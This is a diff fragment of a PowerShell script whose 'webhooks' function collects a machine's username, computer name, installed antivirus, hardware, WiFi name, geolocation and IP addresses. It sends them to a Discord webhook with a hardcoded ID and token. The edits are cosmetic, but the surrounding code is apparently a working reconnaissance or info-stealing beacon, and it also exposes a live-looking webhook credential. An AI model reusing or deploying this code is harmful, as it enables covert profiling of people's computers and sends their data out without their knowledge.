@@ -184,7 +184,7 @@ function webhooks {
     foreach ($disk in $disks) {
         $modeldisk = $disk.Model
         $sizeInGB = [math]::round($disk.Size / 1GB, 2)
-        $diskall += "-- $modeldisk - $sizeInGB GB`n"
+        $diskall += "- $modeldisk - $sizeInGB GB`n"
     }
     $diskall | Out-Null
 
@@ -229,7 +229,7 @@ function webhooks {
     $webhookid = "1337473388624609390"
     $webhooktoken = "frh_h08OFoFeTSUUF-FqHg2ZoJVh6Xjj8YbVzgOyztWuPANtpogg0AUKPWtWC7tsswe8"
     $webhookUrl = "https://discord.com/api/webhooks/$webhookid/$webhooktoken"
-    
+
     # URL Gambar dan Thumbnail
     #$imageUrl = "https://../preview.png"
     #$thumbnailUrl = "https://../preview.png"
@@ -244,7 +244,7 @@ function webhooks {
             color = 3447003
             fields = @(
                 @{ name = ":computer: **System**"; value = "**System:** $osVersion`n**Windows Version:** $winversion`n**Username:** $username`n**CompName:** $compName`n**Language:** $language`n**Antivirus:** $antivirus `n`n"; inline = $false },
-                @{ name = ":desktop: **Hardware**"; value = "**Manufacture:** $Manufacturer`n**Model:** $Type ($Model)`n**CPU:** $($Names) ($($Cores) Core, $($LogicalProcessors) Treads)`n**GPU:** $gpu`n**RAM:** $TotalSizeInGB GB // $Modules`n**Power:** $batteryStatus`n**Screen:** $resolution`n**Disk:**`n $diskall`n"; inline = $false },
+                @{ name = ":desktop: **HARDWARE**"; value = "**Manufacture:** $Manufacturer`n**Model:** $Type ($Model)`n**CPU:** $($Name) ($($Cores) Core, $($LogicalProcessors) Treads)`n**GPU:** $gpu`n**RAM:** $TotalSizeInGB GB // $Modules`n**Power:** $batteryStatus`n**Screen:** $resolution`n**Disk:**`n$diskall`n"; inline = $false },
                 @{ name = ":globe_with_meridians: **Network**"; value = "**SSID:** $WifiName`n**LAN:**n$LanStatus`n**Internet Status:** $InsternetStatus`n**Location:** $($ip.country),  $($ip.city), $($ip.regionName) ($($ip.zip))`n**Gateway IP:** $gatewayIP`n**Internal IP:** $localIP`n**External IP:** $($ip.query)`n"; inline = $false },
                 @{ name = ":shield: **ANTIVIRUS DIPILIH**"; value = " $name`n"; inline = $false }
             )
